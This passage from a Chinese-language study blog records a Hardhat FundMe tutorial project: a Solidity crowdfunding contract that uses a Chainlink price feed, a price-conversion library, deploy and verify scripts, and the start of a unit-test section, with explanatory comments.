class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//从用户获取资金</span><br><br><span class="hljs-comment">//撤出资金</span><br><br><span class="hljs-comment">//设置最小支付金额美元</span><br><br><span class="hljs-comment"><span class="hljs-doctag">///</span> @title Storage相关笔记</span><br><br><span class="hljs-comment"><span class="hljs-doctag">///</span> @author</span><br><br><span class="hljs-comment"><span class="hljs-doctag">///</span> @notice immutable和constant还有function中的变量均不会使用Storage中的空间，</span><br><br><span class="hljs-comment"><span class="hljs-doctag">///</span>正常命名的变量都会使用storage中的地址，数组只会将数组长度存储在storage中，</span><br><br><span class="hljs-comment"><span class="hljs-doctag">///</span>然后通过哈希函数操作得到地址存储位置</span><br><br><span class="hljs-comment"><span class="hljs-doctag">///</span>此外constant变量会直接存储在字节码中</span><br><br><span class="hljs-comment">//SPDX-License-Identifier:MIT</span><br><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.8</span>;<br><br>  <br><br>import <span class="hljs-string">&quot;./PriceConvert.sol&quot;</span>;<br><br>import <span class="hljs-string">&quot;hardhat/console.sol&quot;</span>;<br><br><span class="hljs-function">error <span class="hljs-title">Fundme__NotOwner</span>()</span>;<br><br>  <br><br>contract Fundme &#123;<br><br>    <span class="hljs-comment">//命名规则:immutable变量以i_price，storage变量以s_price;</span><br><br>    <span class="hljs-keyword">using</span> PriceConvert <span class="hljs-keyword">for</span> uint256;<br><br>    uint256 <span class="hljs-keyword">private</span> constant MINIMUMCNY = <span class="hljs-number">50</span> * <span class="hljs-number">10</span> ** <span class="hljs-number">18</span>;<br><br>  <br><br>    address[] <span class="hljs-keyword">private</span> s_funders;<br><br>    mapping(address =&gt; <span class="hljs-built_in">uint</span>) <span class="hljs-keyword">private</span> s_addresstoAmountfunded;<br><br>    address <span class="hljs-keyword">private</span> immutable i_owner;<br><br>    AggregatorV3Interface <span class="hljs-keyword">private</span> s_priceFeed;<br><br>  <br><br>    constructor(address priceFeedAddress) &#123;<br><br>        <span class="hljs-comment">// console.log(&quot;now we constructing&quot;);</span><br><br>        i_owner = msg.sender;<br><br>        s_priceFeed = AggregatorV3Interface(priceFeedAddress);<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">fund</span>() <span class="hljs-keyword">public</span> payable</span> &#123;<br><br>        require(<br><br>            msg.<span class="hljs-keyword">value</span>.GetConversionRate(s_priceFeed) &gt;= MINIMUMCNY,<br><br>            <span class="hljs-string">&quot;You need to speed more ETH&quot;</span><br><br>        );<br><br>        s_funders.push(msg.sender);<br><br>        s_addresstoAmountfunded[msg.sender] = msg.<span class="hljs-keyword">value</span>;<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">Withdraw</span>() <span class="hljs-keyword">public</span> onlyOwner</span> &#123;<br><br>        <span class="hljs-keyword">for</span> (<br><br>            uint256 funderIndex = <span class="hljs-number">0</span>;<br><br>            funderIndex &lt; s_funders.length;<br><br>            funderIndex++<br><br>        ) &#123;<br><br>            address funder = s_funders[funderIndex];<br><br>            s_addresstoAmountfunded[funder] = <span class="hljs-number">0</span>;<br><br>        &#125;<br><br>  <br><br>        s_funders = <span class="hljs-keyword">new</span> address[](<span class="hljs-number">0</span>); <span class="hljs-comment">//清空数组</span><br><br>  <br><br>        <span class="hljs-comment">//call</span><br><br>        (<span class="hljs-built_in">bool</span> callSuccess, ) = payable(msg.sender).call&#123;<br><br>            <span class="hljs-keyword">value</span>: address(<span class="hljs-keyword">this</span>).balance<br><br>        &#125;(<span class="hljs-string">&quot;&quot;</span>);<br><br>        require(callSuccess, <span class="hljs-string">&quot;call failed&quot;</span>);<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">cheaperWithdraw</span>() <span class="hljs-keyword">public</span> onlyOwner</span> &#123;<br><br>        address[] memory funders = s_funders;<br><br>        <span class="hljs-keyword">for</span> (<br><br>            uint256 funderIndex = <span class="hljs-number">0</span>;<br><br>            funderIndex &lt; funders.length;<br><br>            funderIndex++<br><br>        ) &#123;<br><br>            address funder = funders[funderIndex];<br><br>            s_addresstoAmountfunded[funder] = <span class="hljs-number">0</span>;<br><br>        &#125;<br><br>  <br><br>        s_funders = <span class="hljs-keyword">new</span> address[](<span class="hljs-number">0</span>); <span class="hljs-comment">//清空数组</span><br><br>  <br><br>        <span class="hljs-comment">//call</span><br><br>        (<span class="hljs-built_in">bool</span> callSuccess, ) = payable(msg.sender).call&#123;<br><br>            <span class="hljs-keyword">value</span>: address(<span class="hljs-keyword">this</span>).balance<br><br>        &#125;(<span class="hljs-string">&quot;&quot;</span>);<br><br>        require(callSuccess, <span class="hljs-string">&quot;call failed&quot;</span>);<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-comment">//在其他函数前面加上这个修饰器的名字在函数运行前会先进行这里面的判断</span><br><br>    <span class="hljs-comment">//&quot;_;&quot;表是其他代码放在修饰器最前面表示修饰器最后判断，放在最后面表示修饰器最现判断</span><br><br>    <span class="hljs-function">modifier <span class="hljs-title">onlyOwner</span>()</span> &#123;<br><br>        <span class="hljs-comment">// require(msg.sender==owner,Notowner());</span><br><br>        <span class="hljs-keyword">if</span> (msg.sender != i_owner) &#123;<br><br>            <span class="hljs-function">revert <span class="hljs-title">Fundme__NotOwner</span>()</span>;<br><br>        &#125;<br><br>        _;<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">getOwner</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params">address</span>)</span> &#123;<br><br>        <span class="hljs-keyword">return</span> i_owner;<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">getAddressToAmountFunded</span>(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">        address fundingAddress</span></span><br><span class="hljs-params"><span class="hljs-function"></span></span><br><span class="hljs-params"><span class="hljs-function">    </span>) <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>)</span> &#123;<br><br>        <span class="hljs-keyword">return</span> s_addresstoAmountfunded[fundingAddress];<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">getVersion</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>)</span> &#123;<br><br>        <span class="hljs-keyword">return</span> s_priceFeed.version();<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">getFunder</span>(<span class="hljs-params">uint256 index</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params">address</span>)</span> &#123;<br><br>        <span class="hljs-keyword">return</span> s_funders[index];<br><br>    &#125;<br><br>  <br><br>    <span class="hljs-function">function <span class="hljs-title">getPriceFeed</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params">AggregatorV3Interface</span>)</span> &#123;<br><br>        <span class="hljs-keyword">return</span> s_priceFeed;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="PriceFeed"><a href="#PriceFeed" class="headerlink" title="PriceFeed"></a>PriceFeed</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//SPXD-License-Identifier:MIT<br><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.8</span>;<br><br>  <br><br><span class="hljs-keyword">import</span> &quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;;<br><br>  <br><br>library PriceConvert &#123;<br><br>    <span class="hljs-keyword">function</span> GetPrice(<br><br>        AggregatorV3Interface priceFeed<br><br>    ) <span class="hljs-type">internal</span> <span class="hljs-keyword">view</span> <span class="hljs-keyword">returns</span> (uint256) &#123;<br><br>        (, <span class="hljs-type">int</span> price, , , ) = priceFeed.latestRoundData();<br><br>        <span class="hljs-keyword">return</span> uint256(price * <span class="hljs-number">1e10</span>);<br><br>    &#125;<br><br>  <br><br>    // <span class="hljs-keyword">function</span> Getversion() <span class="hljs-type">internal</span> <span class="hljs-keyword">view</span> <span class="hljs-keyword">returns</span>(uint256)&#123;<br><br>    // AggregatorV3Interface priceFeed=AggregatorV3Interface(<span class="hljs-number">0x694AA1769357215DE4FAC081bf1f309aDC325306</span>);<br><br>    // <span class="hljs-keyword">return</span> priceFeed.version();<br><br>    //  &#125;<br><br>    <span class="hljs-keyword">function</span> GetConversionRate(<br><br>        uint256 ethAmount,<br><br>        AggregatorV3Interface priceFeed<br><br>    ) <span class="hljs-type">internal</span> <span class="hljs-keyword">view</span> <span class="hljs-keyword">returns</span> (uint256) &#123;<br><br>        uint256 ethprice = GetPrice(priceFeed);<br><br>        uint256 ethAmountInCn = (ethprice * ethAmount) / <span class="hljs-number">1e18</span>;<br><br>        <span class="hljs-keyword">return</span> ethAmountInCn;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="mocks部署脚本"><a href="#mocks部署脚本" class="headerlink" title="mocks部署脚本"></a>mocks部署脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123; network &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123;<br><br>  developmentChains,<br><br>  <span class="hljs-variable constant_">DECIMALS</span>,<br><br>  <span class="hljs-variable constant_">INITIAL_ANSWER</span>,<br><br>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../helper-hardhat-config&quot;</span>);<br><br>  <br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">async</span> (&#123; getNamedAccounts, deployments &#125;) =&gt; &#123;<br><br>  <span class="hljs-keyword">const</span> &#123; deploy, log &#125; = deployments;<br><br>  <span class="hljs-keyword">const</span> &#123; deployer &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getNamedAccounts</span>();<br><br>  <span class="hljs-keyword">const</span> chainId = network.<span class="hljs-property">config</span>.<span class="hljs-property">chainId</span>;<br><br>  <br><br>  <span class="hljs-keyword">if</span> (developmentChains.<span class="hljs-title function_">includes</span>(network.<span class="hljs-property">name</span>)) &#123;<br><br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Local network detected! Deploying mocks..&quot;</span>);<br><br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">deploy</span>(<span class="hljs-string">&quot;MockV3Aggregator&quot;</span>, &#123;<br><br>      <span class="hljs-attr">contract</span>: <span class="hljs-string">&quot;MockV3Aggregator&quot;</span>,<br><br>      <span class="hljs-attr">from</span>: deployer,<br><br>      <span class="hljs-attr">log</span>: <span class="hljs-literal">true</span>,<br><br>      <span class="hljs-comment">/*下面是传入MockV3Aggregator中的构造参数*/</span><br><br>      <span class="hljs-attr">args</span>: [<span class="hljs-variable constant_">DECIMALS</span>, <span class="hljs-variable constant_">INITIAL_ANSWER</span>],<br><br>    &#125;);<br><br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Mocks deployed!&quot;</span>);<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;-------------------------------------------&quot;</span>);<br><br>  &#125;<br><br>&#125;;<br><br>  <br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">tags</span> = [<span class="hljs-string">&quot;all&quot;</span>, <span class="hljs-string">&quot;mocks&quot;</span>];<br></code></pre></td></tr></table></figure><h3 id="Fundme部署脚本"><a href="#Fundme部署脚本" class="headerlink" title="Fundme部署脚本"></a>Fundme部署脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// async function deployFunc(hre)&#123;</span><br><br><span class="hljs-comment">// hre.getNamedAccounts()</span><br><br><span class="hljs-comment">// hre.deployments</span><br><br>  <br><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// module.exports.default=deployFunc</span><br><br><span class="hljs-comment">//上面的module.exports和下面的写法作用相同</span><br><br><span class="hljs-comment">// module.exports=async(hre)=&gt;&#123;</span><br><br><span class="hljs-comment">//     const&#123;getNamedAccount,deployments&#125;=hre;</span><br><br><span class="hljs-comment">// &#125;</span><br><br>  <br><br><span class="hljs-comment">//const helperConfig=require(&quot;../helper-hardhat-config&quot;)</span><br><br><span class="hljs-comment">//const networkConfig=helperConfig.networkConfig</span><br><br><span class="hljs-keyword">const</span> &#123;<br><br>  networkConfig,<br><br>  developmentChains,<br><br>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../helper-hardhat-config&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123; network &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123; verify &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../utils/verify&quot;</span>);<br><br>  <br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">async</span> (&#123; getNamedAccounts, deployments &#125;) =&gt; &#123;<br><br>  <span class="hljs-keyword">const</span> &#123; deploy, log &#125; = deployments;<br><br>  <span class="hljs-keyword">const</span> &#123; deployer &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getNamedAccounts</span>();<br><br>  <span class="hljs-keyword">const</span> chainId = network.<span class="hljs-property">config</span>.<span class="hljs-property">chainId</span>;<br><br>  <br><br>  <span class="hljs-keyword">let</span> ethUsdPriceFeedAddress;<br><br>  <span class="hljs-keyword">if</span> (developmentChains.<span class="hljs-title function_">includes</span>(network.<span class="hljs-property">name</span>)) &#123;<br><br>    <span class="hljs-keyword">const</span> ethUsdAggregator = <span class="hljs-keyword">await</span> deployments.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;MockV3Aggregator&quot;</span>);<br><br>    ethUsdPriceFeedAddress = ethUsdAggregator.<span class="hljs-property">address</span>;<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    ethUsdPriceFeedAddress = networkConfig[chainId][<span class="hljs-string">&quot;ethUsdPriceFeed&quot;</span>];<br><br>  &#125;<br><br>  <span class="hljs-keyword">const</span> args = [ethUsdPriceFeedAddress];<br><br>  <br><br>  <span class="hljs-keyword">const</span> fundMe = <span class="hljs-keyword">await</span> <span class="hljs-title function_">deploy</span>(<span class="hljs-string">&quot;Fundme&quot;</span>, &#123;<br><br>    <span class="hljs-attr">from</span>: deployer,<br><br>    <span class="hljs-attr">args</span>: args,<br><br>    <span class="hljs-attr">log</span>: <span class="hljs-literal">true</span>,<br><br>    <span class="hljs-attr">waitConfirmations</span>: network.<span class="hljs-property">config</span>.<span class="hljs-property">blockConfirmations</span> || <span class="hljs-number">1</span>,<br><br>  &#125;);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;fundme deployed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (<br><br>    !developmentChains.<span class="hljs-title function_">includes</span>(network.<span class="hljs-property">name</span>) &amp;&amp;<br><br>    process.<span class="hljs-property">env</span>.<span class="hljs-property">ETHERSCAN_API_KEY</span><br><br>  ) &#123;<br><br>    <span class="hljs-comment">//verify</span><br><br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">verify</span>(fundMe.<span class="hljs-property">address</span>, args);<br><br>  &#125;<br><br>  <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;----------------------------------------------------&quot;</span>);<br><br>  <br><br>  <span class="hljs-comment">// const ethUsdPriceFeedAddress = networkConfig[chainId][&quot;ethUsdPricceFeed&quot;];</span><br><br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">tags</span> = [<span class="hljs-string">&quot;all&quot;</span>, <span class="hljs-string">&quot;fundme&quot;</span>];<br></code></pre></td></tr></table></figure><p>在不部署之后需要对合约进行验证，即verify，但是在verify之前需要等待6各区块我们的部署的这个交易才能确定上链所以这里调用了hardhat.config中的blockConfirmations。</p><h3 id="verify"><a href="#verify" class="headerlink" title="verify"></a>verify</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123; run &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">verify</span>(<span class="hljs-params">contractAddress, args</span>) &#123;<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Verifying contract...&quot;</span>);<br><br>  <span class="hljs-keyword">try</span> &#123;<br><br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">run</span>(<span class="hljs-string">&quot;verify:verify&quot;</span>, &#123;<br><br>      <span class="hljs-attr">address</span>: contractAddress,<br><br>      <span class="hljs-attr">constructorArguments</span>: args,<br><br>    &#125;);<br><br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br><br>    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">message</span>.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;already verified&quot;</span>)) &#123;<br><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Already Verified!&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br><br>    &#125;<br><br>  &#125;<br><br>&#125;<br><br>  <br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123; verify &#125;;<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>这个测试是在本地运行的，花了很多时间用来修改因为版本问题出现的报错，注意事项写在代码的注释里了，不再赘述</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 